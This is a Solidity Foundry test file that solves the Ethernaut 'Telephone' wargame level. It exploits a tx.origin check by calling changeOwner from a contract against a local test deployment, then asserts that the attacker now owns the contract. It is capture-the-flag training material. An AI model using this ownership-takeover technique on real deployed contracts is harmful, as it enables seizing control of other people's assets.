// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "ds-test/test.sol";
import "forge-std/Test.sol";
import "../src/04_Telephone.sol";

/*
Author: @BoscoHuang

Attack Process:
- The `changeOwner` function is vulnerable to a transaction origin attack.
- The `tx.origin` is the address of the account that initiated the transaction.

Command:
- forge test --match-contract TelephoneTest --fork-url http://127.0.0.1:8545 -vvv
*/

contract TelephoneTest is DSTest {
    Telephone Ethernaut04;

    function setUp() public {
        Ethernaut04 = Telephone(payable(0x5FbDB2315678afecb367f032d93F642f64180aa3)); // Telephone address in anvil
    }

    function testEthernaut04() public {
        console.log("Ethernaut04 owner:", Ethernaut04.owner()); // Owner is zero address

        Ethernaut04.changeOwner(address(this));

        assert(address(this) == Ethernaut04.owner()); // Attacker becomes the owner

        console.log("Ethernaut04 owner:", Ethernaut04.owner());
    }
}

